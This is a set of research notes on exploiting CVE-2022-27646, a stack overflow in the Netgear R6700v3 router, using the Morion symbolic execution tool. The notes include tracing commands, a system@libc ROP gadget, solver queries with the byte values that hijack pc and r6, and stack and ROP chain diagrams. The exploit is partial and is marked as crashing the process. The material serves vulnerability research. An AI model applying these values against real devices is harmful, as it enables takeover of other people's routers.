# Exploiting a Stack Buffer Overflow (CVE-2022-27646) on the Netgear R6700v3 with the Help of Symbolic Execution
## Morion Usage
----------------------------------------------------------------------------------------------------
### Tracing
- R6700v3:
    ```
    ./circled.sh
    ```
- Morion:
    ```
    cp circled.init.yaml circled.yaml; gdb-multiarch -q -x circled.gdb
    ```
### Symbolic Execution
- Morion:
    ```
    morion_control_hijacker circled.yaml
    ```
## Exploitation Strategy
----------------------------------------------------------------------------------------------------
- Symbolic execution shows that we have full control over registers `pc` and `r4-r11`.
- Find a code snippet (gadget) that calls the `system@libc` function and allows
  us to set the `r0` register (address of system command to execute).
  ```
  rop --grep "94a0"
  [...CUT...]
  0x0000c9ac : add r0, r4, r0 ; add r1, r4, r1 ; bl #0x9878 ; mov r0, r6 ; bl #0x94a0 ; mov r0, r6 ; bl #0x9854 ; mov r0, r7 ; add sp, sp, #0x10 ; pop {r4, r5, r6, r7, r8, sb, sl, pc}
  [...CUT...]
  ```
  - Candiate: `mov r0, r6; bl #0x94a0;` at address `0xc9b8`
  - Note: The above candidate code snippet is simple to achieve code execution, however
  does not smootly return and will therefore crash the targeted process.
- Generate exploit:
  - Make register `pc` become `0xc9b8` (address of `system@libc` gadget)
  - Make register `r6` become `0xbeffc114+34` (address within targeted stack buffer - constant since no ASLR)
    - Start address of targeted stack buffer: `0xbeffc114`
    - First 34 bytes (an MD5 sum plus `b"\n\x00"`) of targeted stack buffer are not symbolic (i.e. we do not control)
  ```
  from pprint import pprint
  ast = ctx.getAstContext()
  pc = ctx.getRegisterAst(ctx.registers.pc)
  r6 = ctx.getRegisterAst(ctx.registers.r6)
  pprint(ctx.getModel(ast.land([pc == 0xc9b8, r6 == 0xbeffc114+34])))
  {
    368: 0xbeffc284 (MODEL:fgets@libc:s+368):8 = 0x36,
    369: 0xbeffc285 (MODEL:fgets@libc:s+369):8 = 0xc1,
    370: 0xbeffc286 (MODEL:fgets@libc:s+370):8 = 0xff,
    371: 0xbeffc287 (MODEL:fgets@libc:s+371):8 = 0xbe,
    392: 0xbeffc29c (MODEL:fgets@libc:s+392):8 = 0xb8,
    393: 0xbeffc29d (MODEL:fgets@libc:s+393):8 = 0xc9,
    394: 0xbeffc29e (MODEL:fgets@libc:s+394):8 = 0x0,
    395: 0xbeffc29f (MODEL:fgets@libc:s+395):8 = 0x0
  }
  ```
  TODO:
  ```
  pprint(ctx.getModel(r4 == 0xbeffc114+34))
  {
      360: 0xbeffc27c (MODEL:fgets@libc:s+360):8 = 0x36,
      361: 0xbeffc27d (MODEL:fgets@libc:s+361):8 = 0xc1,
      362: 0xbeffc27e (MODEL:fgets@libc:s+362):8 = 0xff,
      363: 0xbeffc27f (MODEL:fgets@libc:s+363):8 = 0xbe
  }
  ```
- Put command string at adddress `0xbeffc114+34`
### Return Oriented Programming (ROP) Chains


## Benefits of Using Symbolic Execution
----------------------------------------------------------------------------------------------------
### Pros
- We learn about the vulnerability capabilities
  - What registers and memory areas we control and how
### Cons
- Semantic function modelling is hard, but required (here e.g. for `sscanf`)

## To Do
----------------------------------------------------------------------------------------------------
- ROP chain that does not crash
    0xb6e010c8 : mov r4, r3 ; mov r0, r4 ; pop {r4, pc}
    ...

- 0x00009988 : pop {r3, pc}
- 0x00009984 : blx r3 ; pop {r3, pc}
- 0x0000c668 : mov r0, r4 ; pop {r4, r5, r6, pc}


```
from pprint import pprint
ast = ctx.getAstContext()
pc = ctx.getRegisterAst(ctx.registers.pc)
r4 = ctx.getRegisterAst(ctx.registers.r4)
pprint(ctx.getModel(ast.land([pc == 0xc668, r4 == 0xbeffc136])))
{
    360: 0xbeffc27c (MODEL:fgets@libc:s+360):8 = 0x36,
    361: 0xbeffc27d (MODEL:fgets@libc:s+361):8 = 0xc1,
    362: 0xbeffc27e (MODEL:fgets@libc:s+362):8 = 0xff,
    363: 0xbeffc27f (MODEL:fgets@libc:s+363):8 = 0xbe,
    392: 0xbeffc29c (MODEL:fgets@libc:s+392):8 = 0x68,
    393: 0xbeffc29d (MODEL:fgets@libc:s+393):8 = 0xc6
}
```

----------------------------------------------------------------------------------------------------
fgets:
+- beff c114: 41    33
|  ...
|  beff c133: 41    66
|  beff c134: 41    0a
|  beff c135: 41    00
|  beff c136: 20    20
|  beff c137: 42    42
|  beff c138:
|  beff c139:
|  beff c13a:
|  beff c13b:
|  ...
|  beff c2be: 42    42
|  beff c2bf: 64    64
|  beff c2c0: 17    17
|  beff c2c1: 01    01
|  beff c3c2: 00    00
|  ...
+- beff c513: 00    00

sscanf:
+- beff c614: 42
|  ...
+- beff c713: 42
+- beff c714: 42
|  ...
|  beff c735: 42
|  beff c736: 42
|  beff c737: 42
|  ...
|  beff c79b: 42
|  beff c79c: 64
|  beff c79d: 17
|  beff c79e: 01
|  beff c79f: 00
|  beff c7a0: ??
|  ...
+- beff c814: ??

----------------------------------------------------------------------------------------------------
0x00cf24: pop {r4, r5, r6, r7, r8, r9, r10, r11, pc}
0x011764: ldmib r5! {r0, r2, r5, r, r8, r9, fp, ip, lr, pc}

            +------------------+
beff c87c:  | (r4)             | <-- fp
            +------------------+
            | (r5)             |
            +------------------+
            | (r6)             |
            +------------------+
            | (r7)             |
            +------------------+
            | (r8)             |
            +------------------+
            | (r9)             |
            +------------------+
            | (r10)            |
            +------------------+
            | (r11)            |
            +------------------+
            | (pc)  0001 1764  |
            +------------------+
            |                  | <-- sp
            +------------------+

- [ ] Triton support for instruction `ldmdb r11, {r4, r5, r6, r7, r8, r9, r10, r11, sp, pc}`
  - [X] Update Triton installation
  - [X] Create a sample program with the unsupported instruction
  - [X] Open a Triton Git issue;
- [ ] Document exploit
  - [X] Draw memory layout
  - [X] Draw ROP chain
  - [X] Reimplement and test constraints based on figure
  - [X] Push figures to Git repository